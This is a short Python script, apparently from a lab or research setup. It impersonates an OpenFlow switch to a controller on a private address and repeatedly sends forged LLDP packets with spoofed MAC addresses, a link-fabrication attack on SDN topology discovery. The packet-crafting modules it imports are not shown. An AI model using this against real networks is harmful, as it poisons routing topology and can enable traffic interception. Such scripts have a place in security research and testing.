import sys
from craft_faked import *
from sniff_thread import *
from tcp_handshake import *
from openflow_session_scenario import *


if len(sys.argv)<2:
    print("Usage [interface]")
    exit()

t = TcpHandshake(("192.168.56.102",6633),sys.argv[1])
t.start()

sniffing_thread = Sniff_thread(sys.argv[1],"192.168.56.102",6633,t.sport,1000)
sniffing_thread.threaded_sniff()

analyse_scenario = Openflow_session_scenario(sniffing_thread,t,random.randint(1,1900)*16*16*16*16*16*16+0xffff)
analyse_scenario.launch_threaded()

time.sleep(5)

craft_packets = Craft_faked(t, "LLDP", ("00:00:00:00:00:02", "01:80:c2:00:00:0e", "00:00:00:00:00:01", 2))
for i in range(10):
    craft_packets.send()
    time.sleep(5)
# craft_packets = Craft_faked(t, "LLDP", ("02:eb:9f:67:c9:42", "a5:23:05:00:00:01", "00:00:00:00:00:02", 2))
# craft_packets.send()
# craft_packets = Craft_faked(t, "LLDP","ba:d1:de:a0:00:00","aa:bb:cc:cc:bb:ac")
# craft_packets.send()
# craft_packets = Craft_faked(t, "LLDP","aa:bb:cc:cc:bb:ac","ba:d1:de:a0:00:00")
# craft_packets.send()

time.sleep(50)
print("ENNDINNNNG!")

analyse_scenario.end()
